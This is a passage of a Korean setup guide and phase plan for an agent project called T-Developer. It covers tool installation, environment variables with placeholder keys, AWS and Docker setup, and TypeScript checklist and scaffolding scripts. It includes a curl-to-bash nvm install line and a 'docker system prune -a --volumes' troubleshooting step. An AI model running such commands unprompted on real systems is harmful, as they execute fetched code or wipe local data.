## 시스템 요구사항

### 하드웨어
- **CPU**: 4코어 이상 권장
- **RAM**: 16GB 이상 권장
- **디스크**: 50GB 이상 여유 공간

### 운영체제
- macOS 12.0+
- Ubuntu 20.04+
- Windows 10/11 (WSL2 필수)

## 필수 도구 설치

### 1. Node.js (v18+)
```bash
# NVM 사용 (권장)
curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.0/install.sh | bash
nvm install 18
nvm use 18

# 직접 설치
# https://nodejs.org/en/download/
```

### 2. Python (v3.9+)
```bash
# macOS
brew install python@3.9

# Ubuntu
sudo apt update
sudo apt install python3.9 python3.9-venv

# Windows
# https://www.python.org/downloads/
```

### 3. AWS CLI
```bash
# macOS
brew install awscli

# Linux/WSL
curl "https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip" -o "awscliv2.zip"
unzip awscliv2.zip
sudo ./aws/install

# 설정
aws configure
```

### 4. Docker
```bash
# macOS
brew install --cask docker

# Ubuntu
sudo apt install docker.io docker-compose
sudo usermod -aG docker $USER

# Windows
# Docker Desktop 설치: https://www.docker.com/products/docker-desktop
```

### 5. Git
```bash
# macOS
brew install git

# Ubuntu
sudo apt install git
```

## 프로젝트 설정

### 1. 저장소 클론
```bash
git clone https://github.com/your-org/t-developer.git
cd t-developer
```

### 2. 의존성 설치
```bash
# 루트 디렉토리에서
npm install

# Backend 의존성
cd backend
npm install

# Frontend 의존성
cd ../frontend
npm install
```

### 3. Git Hooks 설정
```bash
# 루트 디렉토리에서
npm run prepare
```

## 환경 변수 구성

### 1. 환경 변수 파일 생성
```bash
# 루트 디렉토리에서
cp .env.example .env

# 보안 설정
chmod 600 .env
```

### 2. 필수 환경 변수 설정
```bash
# .env 파일 편집
nano .env  # 또는 원하는 에디터 사용
```

#### 필수 설정 항목:
```env
# Node 환경
NODE_ENV=development
PORT=3000

# AWS 설정
AWS_ACCESS_KEY_ID=your-access-key
AWS_SECRET_ACCESS_KEY=your-secret-key
AWS_REGION=us-east-1

# AI 서비스 (최소 하나 필수)
OPENAI_API_KEY=sk-...
# 또는
ANTHROPIC_API_KEY=sk-ant-...

# 보안 (강력한 값으로 변경 필수!)
JWT_SECRET=your-super-secure-jwt-secret-min-32-chars
ENCRYPTION_KEY=your-32-character-encryption-key!!

# GitHub (선택사항)
GITHUB_TOKEN=ghp_...
```

## AWS 서비스 설정

### 1. DynamoDB 테이블 생성
```bash
# 스크립트 실행
npm run setup:aws:dynamodb
```

### 2. S3 버킷 생성
```bash
# 스크립트 실행
npm run setup:aws:s3
```

### 3. Bedrock 설정 (선택사항)
```bash
# Bedrock 액세스 활성화
aws bedrock get-foundation-model-availability \
  --region us-east-1 \
  --model-id anthropic.claude-v2
```

## 로컬 개발 환경

### 1. 로컬 서비스 시작
```bash
# Docker Compose로 모든 서비스 시작
docker-compose up -d

# 개별 서비스 시작
docker-compose up -d dynamodb-local
docker-compose up -d redis
```

### 2. 데이터베이스 초기화
```bash
# DynamoDB 로컬 테이블 생성
npm run db:init:local
```

### 3. 개발 서버 시작
```bash
# Backend (터미널 1)
cd backend
npm run dev

# Frontend (터미널 2)
cd frontend
npm run dev
```

### 4. 서비스 접속
- **Frontend**: http://localhost:5173
- **Backend API**: http://localhost:3000
- **API 문서**: http://localhost:3000/api-docs
- **Grafana**: http://localhost:3001 (admin/admin)

## 검증 및 테스트

### 1. 환경 검증
```bash
# 전체 환경 검증
npm run verify:env

# 상세 정보 포함
VERBOSE=true npm run verify:env
```

### 2. 테스트 실행
```bash
# 단위 테스트
npm test

# 통합 테스트
npm run test:integration

# E2E 테스트
npm run test:e2e
```

### 3. 린트 및 포맷팅
```bash
# 린트 검사
npm run lint

# 자동 수정
npm run lint:fix

# 코드 포맷팅
npm run format
```

## 문제 해결

### 포트 충돌
```bash
# 사용 중인 포트 확인
lsof -i :3000
lsof -i :5173

# 프로세스 종료
kill -9 <PID>
```

### Docker 문제
```bash
# Docker 재시작
docker-compose down
docker-compose up -d

# 볼륨 정리
docker system prune -a --volumes
```

### 권한 문제
```bash
# node_modules 권한 수정
sudo chown -R $(whoami) node_modules

# npm 캐시 정리
npm cache clean --force
```

### AWS 연결 문제
```bash
# 자격 증명 확인
aws sts get-caller-identity

# 리전 확인
echo $AWS_REGION
```

## 다음 단계

개발 환경 설정이 완료되었다면:

1. [아키텍처 문서](../architecture/overview.md) 읽기
2. [개발 가이드](../development/getting-started.md) 확인
3. [첫 번째 에이전트 만들기](../tutorials/first-agent.md)

---

문제가 있거나 도움이 필요하면 [이슈 트래커](https://github.com/your-org/t-developer/issues)에 문의하세요.
```

### SubTask 0.14.4: Phase 0 완료 체크리스트
**목표**: Phase 0의 모든 작업이 완료되었는지 최종 확인

**구현 내용**:
```typescript
// scripts/phase0-checklist.ts
import fs from 'fs/promises';
import path from 'path';
import chalk from 'chalk';
import { exec } from 'child_process';
import { promisify } from 'util';

const execAsync = promisify(exec);

interface ChecklistItem {
  task: string;
  description: string;
  check: () => Promise<boolean>;
  critical: boolean;
}

class Phase0Checklist {
  private items: ChecklistItem[] = [
    // Task 0.1: 개발 환경 초기 설정
    {
      task: '0.1.1',
      description: '필수 도구 설치 확인',
      check: async () => {
        try {
          await execAsync('node --version');
          await execAsync('npm --version');
          await execAsync('aws --version');
          await execAsync('docker --version');
          return true;
        } catch {
          return false;
        }
      },
      critical: true
    },
    {
      task: '0.1.2',
      description: '프로젝트 구조 생성',
      check: async () => {
        const dirs = ['backend', 'frontend', 'infrastructure', 'docs'];
        for (const dir of dirs) {
          try {
            await fs.access(dir);
          } catch {
            return false;
          }
        }
        return true;
      },
      critical: true
    },
    {
      task: '0.1.3',
      description: 'Git 저장소 초기화',
      check: async () => {
        try {
          await fs.access('.git');
          await fs.access('.gitignore');
          return true;
        } catch {
          return false;
        }
      },
      critical: true
    },
    {
      task: '0.1.4',
      description: '환경 변수 템플릿',
      check: async () => {
        try {
          await fs.access('.env.example');
          return true;
        } catch {
          return false;
        }
      },
      critical: true
    },
    
    // Task 0.2: AWS 기본 설정
    {
      task: '0.2.1',
      description: 'AWS 계정 및 권한 설정',
      check: async () => {
        try {
          const { stdout } = await execAsync('aws sts get-caller-identity');
          return stdout.includes('UserId');
        } catch {
          return false;
        }
      },
      critical: true
    },
    {
      task: '0.2.3',
      description: 'DynamoDB 테이블 설계',
      check: async () => {
        try {
          await fs.access('infrastructure/dynamodb/schemas');
          return true;
        } catch {
          return false;
        }
      },
      critical: false
    },
    
    // Task 0.3: 프로젝트 의존성 설정
    {
      task: '0.3.1',
      description: 'Backend 패키지 설정',
      check: async () => {
        try {
          await fs.access('backend/package.json');
          await fs.access('backend/tsconfig.json');
          return true;
        } catch {
          return false;
        }
      },
      critical: true
    },
    {
      task: '0.3.2',
      description: 'Frontend 패키지 설정',
      check: async () => {
        try {
          await fs.access('frontend/package.json');
          await fs.access('frontend/vite.config.ts');
          return true;
        } catch {
          return false;
        }
      },
      critical: true
    },
    
    // Task 0.4: 보안 및 인증 기초 설정
    {
      task: '0.4.1',
      description: '환경 변수 암호화',
      check: async () => {
        try {
          await fs.access('backend/src/utils/crypto.ts');
          return true;
        } catch {
          return false;
        }
      },
      critical: false
    },
    
    // Task 0.5: 개발 도구 설정
    {
      task: '0.5.1',
      description: 'ESLint 설정',
      check: async () => {
        try {
          await fs.access('.eslintrc.js');
          return true;
        } catch {
          return false;
        }
      },
      critical: false
    },
    {
      task: '0.5.2',
      description: 'Prettier 설정',
      check: async () => {
        try {
          await fs.access('.prettierrc');
          return true;
        } catch {
          return false;
        }
      },
      critical: false
    },
    
    // Task 0.6: 테스트 환경 설정
    {
      task: '0.6.1',
      description: 'Jest 설정',
      check: async () => {
        try {
          await fs.access('backend/jest.config.js');
          return true;
        } catch {
          return false;
        }
      },
      critical: false
    },
    
    // Task 0.7: CI/CD 파이프라인 기초
    {
      task: '0.7.1',
      description: 'GitHub Actions 워크플로우',
      check: async () => {
        try {
          await fs.access('.github/workflows');
          return true;
        } catch {
          return false;
        }
      },
      critical: false
    },
    
    // Task 0.8: 문서화 기반
    {
      task: '0.8.1',
      description: '문서 구조',
      check: async () => {
        try {
          await fs.access('docs');
          const files = await fs.readdir('docs');
          return files.length > 0;
        } catch {
          return false;
        }
      },
      critical: false
    },
    
    // Task 0.9: 로컬 개발 환경
    {
      task: '0.9.1',
      description: 'Docker Compose 설정',
      check: async () => {
        try {
          await fs.access('docker-compose.yml');
          return true;
        } catch {
          return false;
        }
      },
      critical: false
    },
    
    // Task 0.10: 보안 강화
    {
      task: '0.10.1',
      description: '보안 미들웨어',
      check: async () => {
        try {
          await fs.access('backend/src/middleware/security.ts');
          return true;
        } catch {
          return false;
        }
      },
      critical: false
    },
    
    // Task 0.11: 모니터링 기초
    {
      task: '0.11.1',
      description: '로깅 시스템',
      check: async () => {
        try {
          await fs.access('backend/src/config/logger.ts');
          return true;
        } catch {
          return false;
        }
      },
      critical: false
    },
    
    // Task 0.12: 개발 효율성 도구
    {
      task: '0.12.1',
      description: '코드 생성기',
      check: async () => {
        try {
          await fs.access('scripts/generators');
          return true;
        } catch {
          return false;
        }
      },
      critical: false
    },
    
    // Task 0.13: 에이전트 개발 환경
    {
      task: '0.13.1',
      description: '에이전트 프레임워크',
      check: async () => {
        try {
          await fs.access('backend/src/agents/framework/base-agent.ts');
          return true;
        } catch {
          return false;
        }
      },
      critical: true
    },
    
    // Task 0.14: Phase 0 마무리
    {
      task: '0.14.1',
      description: '통합 테스트',
      check: async () => {
        try {
          const { stdout } = await execAsync('npm test -- --passWithNoTests');
          return true;
        } catch {
          return false;
        }
      },
      critical: false
    }
  ];
  
  async run(): Promise<void> {
    console.log(chalk.blue.bold('\n🔍 Phase 0 완료 체크리스트\n'));
    console.log(chalk.gray('='.repeat(60)) + '\n');
    
    let passCount = 0;
    let criticalFailCount = 0;
    
    for (const item of this.items) {
      const result = await item.check();
      const icon = result ? chalk.green('✅') : chalk.red('❌');
      const taskColor = result ? chalk.green : chalk.red;
      
      console.log(
        `${icon} ${chalk.gray(`[${item.task}]`)} ${taskColor(item.description)}` +
        (item.critical && !result ? chalk.red(' (필수)') : '')
      );
      
      if (result) {
        passCount++;
      } else if (item.critical) {
        criticalFailCount++;
      }
    }
    
    // 결과 요약
    console.log('\n' + chalk.gray('='.repeat(60)));
    console.log(chalk.blue.bold('\n📊 결과 요약\n'));
    
    const totalItems = this.items.length;
    const completionRate = Math.round((passCount / totalItems) * 100);
    
    console.log(`완료: ${chalk.green(passCount)}/${totalItems} (${completionRate}%)`);
    console.log(`필수 항목 실패: ${chalk.red(criticalFailCount)}`);
    
    if (criticalFailCount > 0) {
      console.log('\n' + chalk.red.bold('❌ Phase 0를 완료하기 전에 필수 항목을 해결해야 합니다.'));
    } else if (passCount === totalItems) {
      console.log('\n' + chalk.green.bold('🎉 축하합니다! Phase 0가 완벽하게 완료되었습니다!'));
      console.log(chalk.green('이제 Phase 1로 진행할 수 있습니다.'));
    } else {
      console.log('\n' + chalk.yellow.bold('⚠️  Phase 0의 필수 항목은 완료되었지만 일부 선택 항목이 남아있습니다.'));
      console.log(chalk.yellow('Phase 1로 진행할 수 있지만, 나중에 완료하는 것을 권장합니다.'));
    }
    
    // 다음 단계 안내
    console.log('\n' + chalk.blue.bold('📌 다음 단계:'));
    console.log(chalk.gray('1. 남은 항목 완료 (선택사항)'));
    console.log(chalk.gray('2. Phase 1: 코어 인프라 구축 시작'));
    console.log(chalk.gray('   - npm run phase1:start'));
  }
}

// 실행
if (require.main === module) {
  const checklist = new Phase0Checklist();
  checklist.run().catch(console.error);
}

export { Phase0Checklist };
```

## Task 0.15: Phase 0 완료 및 Phase 1 준비

### SubTask 0.15.1: Phase 0 학습 정리
**목표**: Phase 0에서 얻은 교훈과 개선점 정리

**구현 내용**:
```markdown
<!-- docs/phases/phase0-retrospective.md -->
# Phase 0 회고 및 학습 정리

## 📊 Phase 0 개요
- **기간**: [시작일] ~ [종료일]
- **목표**: T-Developer 개발을 위한 기반 환경 구축
- **주요 성과**: 15개 Tasks, 60+ SubTasks 완료

## ✅ 완료된 주요 작업

### 1. 개발 환경
- ✅ Node.js 18+ 기반 TypeScript 환경 구축
- ✅ 모노레포 구조 설정 (backend/frontend/infrastructure)
- ✅ Git 워크플로우 및 hooks 설정
- ✅ 환경 변수 관리 체계 구축

### 2. AWS 인프라
- ✅ AWS 계정 및 IAM 권한 설정
- ✅ DynamoDB 스키마 설계
- ✅ S3 버킷 구조 설계
- ✅ 로컬 개발용 AWS 서비스 에뮬레이션

### 3. 개발 도구
- ✅ ESLint/Prettier 코드 품질 도구
- ✅ Jest 기반 테스트 환경
- ✅ Docker Compose 로컬 환경
- ✅ CI/CD 파이프라인 기초

### 4. 보안 및 모니터링
- ✅ 보안 미들웨어 구현
- ✅ 환경 변수 암호화
- ✅ 로깅 및 메트릭 수집 기반
- ✅ 입력 검증 및 살균

### 5. 에이전트 프레임워크
- ✅ BaseAgent 추상 클래스
- ✅ 에이전트 간 통신 프로토콜
- ✅ AWS Bedrock/Agent Squad 통합 준비
- ✅ Agno 모니터링 통합 준비

## 📚 주요 학습 사항

### 1. 아키텍처 결정
- **모노레포 접근**: Nx 없이도 npm workspaces로 충분
- **TypeScript 설정**: strict 모드가 초기엔 번거롭지만 장기적으로 유리
- **Docker 활용**: 로컬 개발 환경 일관성 확보에 필수

### 2. AWS 서비스
- **DynamoDB**: 단일 테이블 설계가 복잡하지만 성능상 이점
- **로컬 에뮬레이션**: LocalStack보다 개별 서비스 컨테이너가 안정적
- **IAM 권한**: 최소 권한 원칙 준수의 중요성

### 3. 개발 프로세스
- **자동화의 가치**: 반복 작업은 즉시 스크립트화
- **문서화**: 코드와 함께 문서도 동시 작성이 효율적
- **테스트 우선**: TDD는 아니더라도 테스트 가능한 구조 설계 필수

## 🔧 개선 필요 사항

### 1. 성능 최적화
- [ ] 빌드 시간 단축 (현재 3분 → 목표 1분)
- [ ] 테스트 병렬화로 실행 시간 개선
- [ ] Docker 이미지 크기 최적화

### 2. 개발자 경험
- [ ] 더 나은 에러 메시지
- [ ] 자동 완성 및 IntelliSense 개선
- [ ] 디버깅 환경 강화

### 3. 문서화
- [ ] API 문서 자동 생성 개선
- [ ] 인터랙티브 튜토리얼 추가
- [ ] 비디오 가이드 제작

## 💡 Phase 1을 위한 제안

### 1. 우선순위
1. **코어 에이전트 시스템**: BaseAgent를 기반으로 한 실제 구현
2. **데이터 레이어**: DynamoDB 통합 및 캐싱 전략
3. **API Gateway**: RESTful API 및 WebSocket 구현

### 2. 위험 요소
- **Bedrock 통합**: API 제한 및 비용 관리 필요
- **멀티 에이전트 조정**: 복잡도 관리 전략 필요
- **실시간 통신**: WebSocket 연결 안정성

### 3. 성공 지표
- 첫 번째 에이전트 동작 확인
- 기본 API 엔드포인트 구현
- 에이전트 간 통신 검증

## 🎯 다음 단계

### Phase 1 시작 준비
```bash
# Phase 1 브랜치 생성
git checkout -b phase1-core-infrastructure

# Phase 1 작업 디렉토리 준비
mkdir -p backend/src/core
mkdir -p backend/src/data
mkdir -p backend/src/api

# Phase 1 체크리스트 생성
npm run phase1:init
```

### 팀 준비 사항
1. Phase 0 코드 리뷰 완료
2. AWS 권한 및 리소스 확인
3. Phase 1 작업 분담 회의

---

**작성일**: 2024-XX-XX  
**작성자**: T-Developer Team
```

### SubTask 0.15.2: Phase 1 초기 설정
**목표**: Phase 1 작업을 위한 기초 설정

**구현 내용**:
```typescript
// scripts/init-phase1.ts
import fs from 'fs/promises';
import path from 'path';
import chalk from 'chalk';

class Phase1Initializer {
  async initialize(): Promise<void> {
    console.log(chalk.blue.bold('\n🚀 Phase 1: 코어 인프라 구축 초기화\n'));
    
    // 1. 디렉토리 구조 생성
    await this.createDirectoryStructure();
    
    // 2. 기본 파일 생성
    await this.createBaseFiles();
    
    // 3. Phase 1 체크리스트 생성
    await this.createChecklist();
    
    console.log(chalk.green.bold('\n✅ Phase 1 초기화 완료!\n'));
    console.log(chalk.gray('다음 명령으로 시작하세요:'));
    console.log(chalk.cyan('  cd backend/src/core'));
    console.log(chalk.cyan('  npm run dev'));
  }
  
  private async createDirectoryStructure(): Promise<void> {
    const directories = [
      // 코어 시스템
      'backend/src/core/config',
      'backend/src/core/errors',
      'backend/src/core/interfaces',
      'backend/src/core/utils',
      
      // 데이터 레이어
      'backend/src/data/repositories',
      'backend/src/data/models',
      'backend/src/data/migrations',
      'backend/src/data/cache',
      
      // API 레이어
      'backend/src/api/controllers',
      'backend/src/api/routes',
      'backend/src/api/middleware',
      'backend/src/api/validators',
      
      // 에이전트 시스템
      'backend/src/agents/implementations',
      'backend/src/agents/orchestrator',
      'backend/src/agents/registry',
      
      // 테스트
      'backend/tests/core',
      'backend/tests/data',
      'backend/tests/api',
      'backend/tests/agents'
    ];
    
    for (const dir of directories) {
      await fs.mkdir(dir, { recursive: true });
      console.log(chalk.green(`✓ Created: ${dir}`));
    }
  }
  
  private async createBaseFiles(): Promise<void> {
    // 코어 설정 파일
    const coreConfig = `// backend/src/core/config/index.ts
export interface CoreConfig {
  app: {
    name: string;
    version: string;
    env: string;
  };
  server: {
    port: number;
    host: string;
  };
  database: {
    dynamodb: {
      region: string;
      endpoint?: string;
    };
  };
  cache: {
    redis: {
      host: string;
      port: number;
    };
  };
  agents: {
    maxConcurrent: number;
    timeout: number;
  };
}

export const config: CoreConfig = {
  app: {
    name: 'T-Developer',
    version: process.env.npm_package_version || '1.0.0',
    env: process.env.NODE_ENV || 'development'
  },
  server: {
    port: parseInt(process.env.PORT || '3000'),
    host: process.env.HOST || '0.0.0.0'
  },
  database: {
    dynamodb: {
      region: process.env.AWS_REGION || 'us-east-1',
      endpoint: process.env.DYNAMODB_ENDPOINT
    }
  },
  cache: {
    redis: {
      host: process.env.REDIS_HOST || 'localhost',
      port: parseInt(process.env.REDIS_PORT || '6379')
    }
  },
  agents: {
    maxConcurrent: parseInt(process.env.MAX_CONCURRENT_AGENTS || '50'),
    timeout: parseInt(process.env.AGENT_TIMEOUT || '300000')
  }
};
`;
    
    await fs.writeFile(
      'backend/src/core/config/index.ts',
      coreConfig
    );
    
    // 에러 클래스
    const baseError = `// backend/src/core/errors/base-error.ts
export abstract class BaseError extends Error {
  abstract statusCode: number;
  abstract code: string;
  
  constructor(message: string) {
    super(message);
    Object.setPrototypeOf(this, BaseError.prototype);
  }
  
  abstract serializeErrors(): { message: string; field?: string }[];
}

export class NotFoundError extends BaseError {
  statusCode = 404;
  code = 'NOT_FOUND';
  
  constructor(public resource: string) {
    super(\`Resource not found: \${resource}\`);
    Object.setPrototypeOf(this, NotFoundError.prototype);
  }
  
  serializeErrors() {
    return [{ message: this.message }];
  }
}
`;
    
    await fs.writeFile(
      'backend/src/core/errors/base-error.ts',
      baseError
    );
    
    console.log(chalk.green('✓ Created base files'));
  }
  
  private async createChecklist(): Promise<void> {
    const checklist = `# Phase 1: 코어 인프라 구축 체크리스트

## Task 1.1: 핵심 설정 시스템
- [ ] 중앙 설정 관리자 구현
- [ ] 환경별 설정 로더
- [ ] 설정 검증 시스템
- [ ] 동적 설정 리로드

## Task 1.2: 에러 처리 시스템
- [ ] 커스텀 에러 클래스 계층구조
- [ ] 전역 에러 핸들러
- [ ] 에러 로깅 및 추적
- [ ] 에러 복구 전략

## Task 1.3: 로깅 인프라
- [ ] 구조화된 로깅 시스템
- [ ] 로그 레벨 관리
- [ ] 로그 집계 및 전송
- [ ] 성능 메트릭 로깅

## Task 1.4: 데이터베이스 연결
- [ ] DynamoDB 클라이언트 설정
- [ ] 연결 풀 관리
- [ ] 재시도 로직
- [ ] 연결 모니터링

## Task 1.5: 캐싱 시스템
- [ ] Redis 클라이언트 설정
- [ ] 캐시 전략 구현
- [ ] 캐시 무효화 로직
- [ ] 캐시 히트율 모니터링

... (추가 Tasks)
`;
    
    await fs.writeFile(
      'docs/phases/phase1-checklist.md',
      checklist
    );
    
    console.log(chalk.green('✓ Created Phase 1 checklist'));
  }
}

// 실행
if (require.main === module) {
  const initializer = new Phase1Initializer();
  initializer.initialize().catch(console.error);
}
```

### SubTask 0.15.3: Phase 0 아카이브 및 문서 정리
**목표**: Phase 0의 모든 작업물을 체계적으로 정리하고 보관

**구현 내용**:
```bash
#!/bin/bash
# scripts/archive-phase0.sh

echo "📦 Phase 0 아카이브 시작..."

# 1. Phase 0 태그 생성
git tag -a "phase0-complete" -m "Phase 0: 사전 준비 및 환경 설정 완료"

# 2. 문서 정리
mkdir -p docs/archive/phase0
cp -r docs/setup docs/archive/phase0/
cp -r docs/phases/phase0-* docs/archive/phase0/

# 3. 설정 파일 백업
mkdir -p backups/phase0
cp .env.example backups/phase0/
cp package.json backups/phase0/
cp -r .github backups/phase0/

# 4. 체크리스트 저장
npm run phase0:checklist > docs/archive/phase0/final-checklist.txt

# 5. 통계 생성
echo "📊 Phase 0 통계 생성 중..."
cat > docs/archive/phase0/statistics.md << EOF
# Phase 0 통계

## 코드 통계
- 총 파일 수: $(find . -type f -name "*.ts" -o -name "*.js" | wc -l)
- TypeScript 라인 수: $(find . -name "*.ts" -exec wc -l {} + | tail -1 | awk '{print $1}')
- 테스트 파일 수: $(find . -name "*.test.ts" -o -name "*.spec.ts" | wc -l)

## Git 통계
- 총 커밋 수: $(git rev-list --count HEAD)
- 기여자 수: $(git shortlog -sn | wc -l)

## 의존성
- Backend 패키지: $(cd backend && npm ls --depth=0 | wc -l)
- Frontend 패키지: $(cd frontend && npm ls --depth=0 | wc -l)

생성일: $(date)
EOF

echo "✅ Phase 0 아카이브 완료!"
echo "📁 아카이브 위치: docs/archive/phase0/"
```

---

이제 Phase 0의 모든 작업이 완료되었습니다! 

Phase 0에서는 T-Developer 프로젝트의 기반이 되는 다음과 같은 핵심 요소들을 구축했습니다:

1. **개발 환경**: Node.js, TypeScript, AWS CLI, Docker 등 필수 도구 설정
2. **프로젝트 구조**: 모노레포 구조와 체계적인 디렉토리 구성
3. **AWS 인프라**: DynamoDB, S3, Bedrock 통합 준비
4. **개발 도구**: ESLint, Prettier, Jest, Git hooks
5. **보안**: 환경 변수 암호화, 입력 검증, 보안 미들웨어
6. **CI/CD**: GitHub Actions 워크플로우
7. **문서화**: 포괄적인 개발 가이드 및 API 문서
8. **모니터링**: 로깅, 메트릭, 에러 추적
9. **에이전트 프레임워크**: BaseAgent 및 통신 프로토콜
10. **통합 준비**: AWS Agent Squad, Bedrock AgentCore, Agno